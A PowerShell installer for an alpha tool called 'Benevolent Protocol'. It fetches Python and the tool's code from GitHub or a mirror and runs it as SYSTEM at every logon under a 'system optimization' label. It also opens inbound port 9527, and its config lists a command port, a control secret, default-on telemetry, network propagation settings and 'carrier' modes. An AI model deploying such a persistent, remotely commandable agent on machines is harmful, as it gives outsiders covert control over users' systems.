#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Benevolent Protocol - Standalone Windows Installer (No Prerequisites)
.DESCRIPTION
    Self-contained installer that bundles Python 3.12 embedded.
    No Python installation required - everything is self-contained.
.PARAMETER Silent
    Run without prompts
.PARAMETER InstallDir
    Installation directory (default: C:\Program Files\BenevolentProtocol)
.PARAMETER StartNow
    Start the protocol after installation
.EXAMPLE
    .\install-standalone.ps1
    .\install-standalone.ps1 -Silent -StartNow
#>

param(
    [switch]$Silent = $false,
    [string]$InstallDir = "C:\Program Files\BenevolentProtocol",
    [string]$ConfigDir = "C:\ProgramData\BenevolentProtocol",
    [switch]$StartNow = $false
)

# ============================================================
# CONFIGURATION
# ============================================================

$VERSION = "0.3.0-alpha"
$PYTHON_VERSION = "3.12.4"
$PYTHON_URL_X64 = "https://www.python.org/ftp/python/$PYTHON_VERSION/python-$PYTHON_VERSION-embed-amd64.zip"
$PYTHON_URL_ARM = "https://www.python.org/ftp/python/$PYTHON_VERSION/python-$PYTHON_VERSION-embed-arm64.zip"
$GETPIP_URL = "https://bootstrap.pypa.io/get-pip.py"
$PROTOCOL_URL = "https://github.com/r0s-org/benevolent_protocol/archive/refs/heads/main.zip"
$PROTOCOL_MIRROR = "https://r0s.org/benevolent_protocol.zip"

# ============================================================
# HELPER FUNCTIONS
# ============================================================

function Write-Header {
    param([string]$Text)
    if (-not $Silent) {
        Write-Host ""
        Write-Host "  " -NoNewline
        Write-Host $Text -ForegroundColor Cyan
        Write-Host ""
    }
}

function Write-Step {
    param([string]$Step, [string]$Text, [string]$Status = "Working")
    if (-not $Silent) {
        $color = switch ($Status) {
            "Working" { "Yellow" }
            "Done" { "Green" }
            "Error" { "Red" }
            "Warning" { "DarkYellow" }
            default { "White"
            }
        }
        Write-Host "  [$Step] " -NoNewline -ForegroundColor Gray
        Write-Host $Text -ForegroundColor $color
    }
}

function Write-Success {
    param([string]$Text)
    if (-not $Silent) {
        Write-Host "  ✓ " -NoNewline -ForegroundColor Green
        Write-Host $Text
    }
}

function Write-Fail {
    param([string]$Text)
    if (-not $Silent) {
        Write-Host "  ✗ " -NoNewline -ForegroundColor Red
        Write-Host $Text
    }
}

function New-RandomHex {
    param([int]$Length = 64)
    $chars = "0123456789ABCDEF"
    $sb = [System.Text.StringBuilder]::new($Length)
    for ($i = 0; $i -lt $Length; $i++) {
        [void]$sb.Append($chars[(Get-Random -Maximum 16)])
    }
    return $sb.ToString()
}

function Invoke-Download {
    param([string]$Url, [string]$OutFile, [string]$Description = "file")

    try {
        $ProgressPreference = 'SilentlyContinue'
        Invoke-WebRequest -Uri $Url -OutFile $OutFile -UseBasicParsing -TimeoutSec 120
        $ProgressPreference = 'Continue'
        return $true
    }
    catch {
        Write-Fail "Failed to download $Description"
        if (-not $Silent) {
            Write-Host "    Error: $($_.Exception.Message)" -ForegroundColor DarkGray
        }
        return $false
    }
}

function Test-Command {
    param([string]$Command)
    try {
        Get-Command $Command -ErrorAction Stop | Out-Null
        return $true
    }
    catch {
        return $false
    }
}

# ============================================================
# MAIN INSTALLER
# ============================================================

$ErrorActionPreference = "Continue"
$LogFile = "$ConfigDir\install.log"
$TempDir = Join-Path $env:TEMP "BP_Install_$(Get-Random)"

# Start transcript
if (-not (Test-Path $ConfigDir)) {
    New-Item -ItemType Directory -Path $ConfigDir -Force | Out-Null
}
Start-Transcript -Path $LogFile -Force | Out-Null

# Header
Clear-Host
Write-Host ""
Write-Host "  ╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "  ║     Benevolent Protocol v$VERSION - Standalone Installer       ║" -ForegroundColor Cyan
Write-Host "  ║                                                              ║" -ForegroundColor Cyan
Write-Host "  ║            No Prerequisites - Everything Included            ║" -ForegroundColor Cyan
Write-Host "  ╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""

# Detect architecture
$IsArm64 = $env:PROCESSOR_ARCHITECTURE -eq "ARM64"
$PythonUrl = if ($IsArm64) { $PYTHON_URL_ARM } else { $PYTHON_URL_X64 }
$Arch = if ($IsArm64) { "ARM64" } else { "x64" }

Write-Host "  Architecture: $Arch" -ForegroundColor DarkGray
Write-Host "  Install Path: $InstallDir" -ForegroundColor DarkGray
Write-Host "  Config Path:  $ConfigDir" -ForegroundColor DarkGray
Write-Host ""

# Step 1: Create directories
Write-Step "1/7" "Creating installation directories..." "Working"

@($InstallDir, $ConfigDir, "$ConfigDir\logs", "$ConfigDir\data", $TempDir) | ForEach-Object {
    if (-not (Test-Path $_)) {
        New-Item -ItemType Directory -Path $_ -Force | Out-Null
    }
}
Write-Success "Directories created"

# Step 2: Download embedded Python
Write-Step "2/7" "Downloading Python $PYTHON_VERSION (embedded)..." "Working"

$PythonZip = Join-Path $TempDir "python_embed.zip"
$PythonDir = Join-Path $InstallDir "python"

if (Invoke-Download -Url $PythonUrl -OutFile $PythonZip -Description "Python embedded") {
    # Extract Python
    if (Test-Path $PythonDir) {
        Remove-Item $PythonDir -Recurse -Force
    }
    Expand-Archive -Path $PythonZip -DestinationPath $PythonDir -Force
    Write-Success "Python extracted to $PythonDir"
}
else {
    Write-Fail "Python download failed. Aborting."
    Stop-Transcript | Out-Null
    exit 1
}

# Step 3: Configure Python environment
Write-Step "3/7" "Configuring Python environment..." "Working"

# Create the ._pth file to enable site-packages
$PthFile = Join-Path $PythonDir "python312._pth"
$PthContent = @"
python312.zip
.
Lib
Lib\site-packages

import site
"@

Set-Content -Path $PthFile -Value $PthContent -Encoding ASCII

# Create Lib directories
New-Item -ItemType Directory -Path "$PythonDir\Lib\site-packages" -Force | Out-Null

# Download and install pip
$GetPip = Join-Path $TempDir "get-pip.py"
if (Invoke-Download -Url $GETPIP_URL -OutFile $GetPip -Description "pip installer") {
    & "$PythonDir\python.exe" $GetPip --no-warn-script-location 2>&1 | Out-Null
    Write-Success "pip installed"
}
else {
    Write-Step "3/7" "pip installation failed - some features may not work" "Warning"
}

# Step 4: Download Protocol
Write-Step "4/7" "Downloading Benevolent Protocol..." "Working"

$ProtocolZip = Join-Path $TempDir "protocol.zip"

# Try primary URL, fall back to mirror
if (-not (Invoke-Download -Url $PROTOCOL_URL -OutFile $ProtocolZip -Description "protocol from GitHub")) {
    if (-not (Invoke-Download -Url $PROTOCOL_MIRROR -OutFile $ProtocolZip -Description "protocol from mirror")) {
        Write-Fail "Protocol download failed. Aborting."
        Stop-Transcript | Out-Null
        exit 1
    }
}

# Extract protocol
$ExtractDir = Join-Path $TempDir "extracted"
Expand-Archive -Path $ProtocolZip -DestinationPath $ExtractDir -Force

# Find the source directory (github adds -main suffix)
$SourceDir = Get-ChildItem "$ExtractDir\benevolent_protocol*" -Directory | Select-Object -First 1

# Copy protocol files
Copy-Item -Path "$SourceDir\src" -Destination "$InstallDir\src" -Recurse -Force
Copy-Item -Path "$SourceDir\config" -Destination "$InstallDir\config" -Recurse -Force
Copy-Item -Path "$SourceDir\requirements.txt" -Destination "$InstallDir\" -Force

# Copy optional files
Copy-Item -Path "$SourceDir\LICENSE" -Destination "$InstallDir\" -Force -ErrorAction SilentlyContinue
Copy-Item -Path "$SourceDir\README.md" -Destination "$InstallDir\" -Force -ErrorAction SilentlyContinue

Write-Success "Protocol files copied"

# Step 5: Install dependencies
Write-Step "5/7" "Installing Python dependencies..." "Working"

$RequirementsFile = Join-Path $InstallDir "requirements.txt"
$PipExe = Join-Path $PythonDir "Scripts\pip.exe"
$PythonExe = Join-Path $PythonDir "python.exe"

if (Test-Path $RequirementsFile) {
    $PipResult = & $PythonExe -m pip install -r $RequirementsFile --no-warn-script-location -q 2>&1
    if ($LASTEXITCODE -eq 0) {
        Write-Success "Dependencies installed"
    }
    else {
        Write-Step "5/7" "Some dependencies may have failed" "Warning"
    }
}
else {
    Write-Step "5/7" "No requirements.txt found - skipping" "Warning"
}

# Step 6: Generate configuration
Write-Step "6/7" "Generating secure configuration..." "Working"

$Secret = New-RandomHex -Length 64
$ConfigFile = Join-Path $ConfigDir "config.json"

$Config = @{
    telemetry_enabled      = $true
    telemetry_level        = "standard"
    telemetry_endpoint     = $null
    heartbeat_interval     = 60
    command_port           = 9527
    optimization_interval  = 3600
    propagation_enabled    = $false
    gaming_mode_auto_detect = $true
    max_cpu_percent        = 30
    max_memory_mb          = 500
    control_secret         = $Secret
    update_endpoint        = $null
    log_level              = "INFO"
    log_file               = "$ConfigDir\logs\protocol.log"
    platform_mode          = "active"
    linux_carrier_mode     = $true
    windows_active_mode    = $true
    android_active_mode    = $true
    allowed_networks       = @("192.168.0.0/16", "10.0.0.0/8", "172.16.0.0/12")
    excluded_hosts         = @()
    install_dir            = $InstallDir
    python_path            = $PythonExe
}

$Config | ConvertTo-Json -Depth 10 | Out-File -FilePath $ConfigFile -Encoding UTF8
Write-Success "Configuration generated"
Write-Host "  Secret: " -NoNewline -ForegroundColor DarkGray
Write-Host $Secret -ForegroundColor Yellow

# Step 7: Create helper scripts and system integration
Write-Step "7/7" "Setting up system integration..." "Working"

# Create batch scripts
$StartBat = @"
@echo off
cd /d "$InstallDir"
python\python.exe -m src.core.orchestrator --config "$ConfigDir\config.json"
pause
"@
Set-Content -Path "$InstallDir\start.bat" -Value $StartBat -Encoding ASCII

$StopBat = @"
@echo off
echo Stopping Benevolent Protocol...
taskkill /F /FI "WINDOWTITLE eq Benevolent*" 2>nul
wmic process where "CommandLine like '%%orchestrator%%'" delete 2>nul
echo Protocol stopped.
pause
"@
Set-Content -Path "$InstallDir\stop.bat" -Value $StopBat -Encoding ASCII

$StatusBat = @"
@echo off
echo.
echo  Benevolent Protocol Status
echo  ==========================
echo.
wmic process where "CommandLine like '%%orchestrator%%'" get ProcessId,CommandLine 2>nul | find "orchestrator" >nul
if %ERRORLEVEL%==0 (
    echo  Status: RUNNING
) else (
    echo  Status: STOPPED
)
echo.
echo  Install: $InstallDir
echo  Config:  $ConfigDir\config.json
echo  Logs:    $ConfigDir\logs\
echo.
pause
"@
Set-Content -Path "$InstallDir\status.bat" -Value $StatusBat -Encoding ASCII

# Create uninstaller
$UninstallBat = @"
@echo off
echo Uninstalling Benevolent Protocol...
schtasks /delete /tn "BenevolentProtocol" /f 2>nul
netsh advfirewall firewall delete rule name="Benevolent Protocol" 2>nul
rmdir /s /q "$InstallDir" 2>nul
rmdir /s /q "$ConfigDir" 2>nul
del "%USERPROFILE%\Desktop\Benevolent Protocol.lnk" 2>nul
echo Uninstall complete.
pause
"@
Set-Content -Path "$InstallDir\uninstall.bat" -Value $UninstallBat -Encoding ASCII

Write-Success "Helper scripts created"

# Create scheduled task
$TaskName = "BenevolentProtocol"
$TaskCmd = "`"$PythonExe`" -m src.core.orchestrator --config `"$ConfigDir\config.json`""

# Remove existing task if present
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue

$Action = New-ScheduledTaskAction -Execute $PythonExe -Argument "-m src.core.orchestrator --config `"$ConfigDir\config.json`"" -WorkingDirectory $InstallDir
$Trigger = New-ScheduledTaskTrigger -AtLogon
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Description "Benevolent Protocol - System optimization service" | Out-Null
Write-Success "Scheduled task created (auto-start at login)"

# Configure firewall
Remove-NetFirewallRule -DisplayName "Benevolent Protocol" -ErrorAction SilentlyContinue
New-NetFirewallRule -DisplayName "Benevolent Protocol" -Direction Inbound -LocalPort 9527 -Protocol TCP -Action Allow -Profile Private, Domain | Out-Null
Write-Success "Firewall rule added (port 9527)"

# Create desktop shortcut
try {
    $WScriptShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WScriptShell.CreateShortcut("$env:USERPROFILE\Desktop\Benevolent Protocol.lnk")
    $Shortcut.TargetPath = "$InstallDir\start.bat"
    $Shortcut.WorkingDirectory = $InstallDir
    $Shortcut.Description = "Start Benevolent Protocol"
    $Shortcut.Save()
    Write-Success "Desktop shortcut created"
}
catch {
    Write-Step "7/7" "Could not create desktop shortcut" "Warning"
}

# Cleanup temp files
Remove-Item -Path $TempDir -Recurse -Force -ErrorAction SilentlyContinue

# ============================================================
# SUMMARY
# ============================================================

Write-Host ""
Write-Host "  ╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Green
Write-Host "  ║                  Installation Complete!                      ║" -ForegroundColor Green
Write-Host "  ╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Green
Write-Host ""
Write-Host "  Installation Directory:" -ForegroundColor White
Write-Host "    $InstallDir" -ForegroundColor Gray
Write-Host ""
Write-Host "  Configuration:" -ForegroundColor White
Write-Host "    $ConfigDir\config.json" -ForegroundColor Gray
Write-Host ""
Write-Host "  Logs:" -ForegroundColor White
Write-Host "    $ConfigDir\logs\" -ForegroundColor Gray
Write-Host ""
Write-Host "  Your Secret Key (save this!):" -ForegroundColor Yellow
Write-Host "    $Secret" -ForegroundColor Cyan
Write-Host ""
Write-Host "  Commands:" -ForegroundColor White
Write-Host "    Start:   $InstallDir\start.bat" -ForegroundColor Gray
Write-Host "    Stop:    $InstallDir\stop.bat" -ForegroundColor Gray
Write-Host "    Status:  $InstallDir\status.bat" -ForegroundColor Gray
Write-Host "    Remove:  $InstallDir\uninstall.bat" -ForegroundColor Gray
Write-Host ""
Write-Host "  The protocol will start automatically when you log in." -ForegroundColor DarkGray
Write-Host ""

# Start now?
if ($StartNow -or (-not $Silent)) {
    if (-not $StartNow) {
        $Response = Read-Host "  Start Benevolent Protocol now? (Y/n)"
        $StartNow = ($Response -ne "n" -and $Response -ne "N")
    }
    
    if ($StartNow) {
        Write-Host ""
        Write-Host "  Starting protocol..." -ForegroundColor Yellow
        Start-ScheduledTask -TaskName $TaskName
        Start-Sleep -Seconds 2
        
        # Check if running
        $Running = Get-Process -Name python -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like "*orchestrator*" }
        if ($Running) {
            Write-Success "Protocol is running!"
        }
        else {
            Write-Step "" "Protocol started - check logs for status" "Warning"
        }
    }
}

Write-Host ""
Write-Host "  Installation log: $LogFile" -ForegroundColor DarkGray
Write-Host ""

Stop-Transcript | Out-Null

exit 0
